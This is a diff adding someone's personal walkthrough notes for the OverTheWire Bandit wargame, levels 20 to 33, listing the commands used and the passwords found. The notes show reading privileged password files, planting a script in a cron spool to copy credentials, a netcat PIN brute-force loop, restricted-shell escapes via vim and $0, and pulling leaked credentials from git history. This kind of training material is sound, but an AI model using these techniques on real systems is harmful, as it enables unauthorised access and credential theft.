@@ -86,4 +86,84 @@ cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
 
 19->20	./bandit20-do cat /etc/bandit_pass/bandit20
 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
-	
+
+20->21	echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" | nc -l -p 7777
+	bg
+	./suconnect
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+
+21->22	cat /etc/cron.d/cronjob_bandit22
+	cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+
+22->23	cat /etc/cron.d/cronjob_bandit23
+	echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+	cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+23->24	mktemp -d
+		/tmp/tmp.XbGrrL4PTU
+	touch /tmp/tmp.XbGrrL4PTU/pass
+	vi /tmp/tmp.XbGrrL4PTU/bandit24_pass.sh
+		#!bin/bash
+		cat /etc/bandit_pass/bandit24 > /tmp/tmp.XbGrrL4PTU/password
+	chmod 777 /tmp/tmp.XbGrrL4PTU
+	chmod 777 /tmp/tmp.XbGrrL4PTU/bandit24_pass.sh
+	chmod 777 /tmp/tmp.XbGrrL4PTU/pass
+	cp /tmp/tmp.XbGrrL4PTU/bandit24_pass.sh /var/spool/bandit24/
+	cat /tmp/tmp.XbGrrL4PTU/pass
+		gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+24->25	mktemp -d
+	cd /tmp/tmp.JKiFnjUE9h
+	vi bruteforce.sh
+		#!bin/bash
+
+		PASSWORD24=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+		for i in {0000..9999};
+        		do echo "$PASSWORD24 $i"
+		done | nc localhost 30002
+	chmod +x bruteforce.sh
+	./bruteforce.sh
+		iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+25->27	scp the ssh key to bandit26
+	resize the window so that the more command on the small text.txt file can let you enter vim
+	then enter shell via vim with :set shell=/bin/bash and :shell
+	use do executable bandit26 to access /etc/bandit_pass/bandit27
+		upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
+
+27->28	from own machine - git clone "ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo"
+	open readme file of repo
+		Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
+
+28->29	from own machine - git clone "ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo"
+	cd to repo
+	git log command show commit history, can see "data leak fixed" is last commit, meaning login credentials were visible before then.
+	git show <commit_hash> to see changes made during that commit. can see visible credentials were added to readme.md file
+		4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+
+29->30	do usual clone thingy, reading readme say "no passwords in prod" meaning there are alt branches for the repo
+	git branch -a shows branch named dev
+	git show origin/dev has uncensored credentials 
+		qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
+30->31	do usual clone thingy
+	git tag shows tag named secret
+	git show secret
+		fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
+
+31->32	do usual clone thingy
+	echo "May I come in?" > key.txt
+	git config user.name bandit31
+	git config user.email "blalala"
+	git commit -a -m "added key.txt"
+	git push
+		3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
+32->33	shell is uppercase and is located in bandit32 ~
+	can manipulate env vars in shell
+	tried $shell, displays current shell
+	found out about $0, tried it, opens enterable text
+	entered /bin/bash logged me into bandit33
+	cat /etc/bandit_pass/bandit33
+		tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
